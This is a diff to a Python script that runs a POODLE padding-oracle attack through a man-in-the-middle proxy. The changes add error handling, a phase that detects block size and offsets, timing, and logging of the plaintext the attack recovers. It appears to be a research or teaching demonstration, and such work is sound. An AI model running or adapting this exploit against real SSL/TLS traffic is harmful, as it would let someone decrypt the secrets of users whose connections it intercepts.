@@ -20,6 +20,7 @@ import ssl
 import logging
 import random
 import string
+import time
 
 sys.path.append('../src')
 from poodle import POODLE
@@ -135,6 +136,8 @@ class PoodleClient(POODLE):
         except (ConnectionResetError, ConnectionRefusedError, ConnectionAbortedError):
             log.error("trigger() Failed to connect!")
             received_data_future.cancel()
+        except OSError as e:
+            log.error("trigger() Something is not right with OS! Exception: %s" % e)
         else:
             # PoodleClient has made a connection and sent a request at this point.
             # Since we really don't care about the response, we could just stop here.
@@ -213,7 +216,7 @@ class MitmTCPHandler(object):
             asyncio.ensure_future(self.client_lock_coro).add_done_callback(self._got_client_lock)
 
         def _got_client_lock(self, task):
-            task.result() # True at this point, but call there will trigger any exceptions
+            task.result()  # True at this point, but call there will trigger any exceptions
             if really_verbose_debugging:
                 log.debug("MitmTCPHandler::MitmServerProtocol::_got_client_lock()")
 
@@ -515,7 +518,7 @@ def main():
     # Start
     with closing(asyncio.get_event_loop()) as loop:
         # Debugging the internals of event loop:
-        #loop.set_debug(True)
+        # loop.set_debug(True)
 
         # Construct a PoodleClient. It knows about the POODLE-flaw and can transmit to given server.
         poodle = PoodleClient(loop, (mitm_host, mitm_port_to_listen), secret)
@@ -534,8 +537,18 @@ def main():
         ## Testing the MITM-scaffolding without POODLE
         # return loop.run_forever()
 
-        log.info('Running poodle')
-        plaintext = poodle.run()
+        log.info('Running poodle-exploit')
+        plaintext = None
+        start_time = None
+        end_time = None
+        if poodle.detect_block_info():
+            log.info("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
+                     (poodle.block_edge, poodle.block_size, poodle.recovery_length))
+            start_time = time.time()
+            plaintext = poodle.exploit()
+            end_time = time.time()
+        else:
+            log.error("Detecting server parameters failed. Cannot continue to exploit-phase.")
 
         # If there are any pending tasks for the servers, wait until they're done.
         loop.run_until_complete(loop.shutdown_asyncgens())
@@ -549,8 +562,11 @@ def main():
         else:
             # Since there is no real way of knowing the actual length of original secret,
             # the plaintext will very likely have extra characters at the end.
-            log.info('Done running poodle. Plaintext is: "%s" (omit the possible garbage at the end), hex: %s' %
-                     (''.join(plaintext), binascii.hexlify(bytearray([ord(c[0]) for c in plaintext]))))
+            log.info('Done running poodle in %f seconds.\nPlaintext is: "%s" (omit the possible garbage at the end)\n'
+                     'Plaintext in hex: %s' %
+                     (end_time - start_time, ''.join(plaintext),
+                      binascii.hexlify(bytearray([ord(c[0]) for c in plaintext]))))
+
 
 if __name__ == "__main__":
     main()
